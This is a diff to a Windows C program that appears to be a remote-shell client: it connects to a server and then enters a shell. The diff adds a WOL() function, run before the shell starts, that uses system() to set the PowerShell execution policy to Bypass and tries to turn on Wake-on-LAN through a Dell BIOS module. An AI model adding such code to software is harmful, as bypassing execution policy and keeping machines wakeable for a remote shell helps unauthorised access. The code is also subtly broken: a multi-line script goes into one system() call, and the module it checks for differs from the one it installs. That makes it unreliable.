@@ -310,6 +310,28 @@ int EstablishConnection(const char *ServerIp, unsigned short ServerPort)
   return 0; // Connection established successfully
 }
 
+void WOL()
+{
+  // Use PowerShell to enable WOL
+  char pws_script[] = "powershell set-executionpolicy -executionpolicy Bypass -Force\n"
+                    "if (-not ((Get-WmiObject win32_bios).Manufacturer -like \"Dell*\")){\n"
+                    "Write-host \"Command must be run against a Dell computer\" exit 1\n"
+                    "}\n"
+                    "if (-not (Get-Module -ListAvailable -Name DellSMBios)){\n"
+                    "Install-Module -Name DellBiosProvider -Force\n"
+                    "}\n"
+                    "Import-Module DellBiosProvider\n"
+                    "if(Test-Path dellsmbios:\\PowerManagement\\WakeOnLan){\n"
+                    "Set-Item -Path dellsmbios:\\PowerManagement\\WakeOnLan LANOnly\n"
+                    "}\n"
+                    "else{\n"
+                    "Write-host \"Computer does not support WakeOnLAN\"\n"
+                    "}";
+  // Enable the rights
+  system("powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass");
+  system(pws_script);
+}
+
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
 {
   if (hPrev != 0)
@@ -343,6 +365,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     // error("Coudln't establish connection.");
     return 1;
   }
+
+  // Enable WOL
+  WOL();
 
   // Enter into Shell
   Shell();
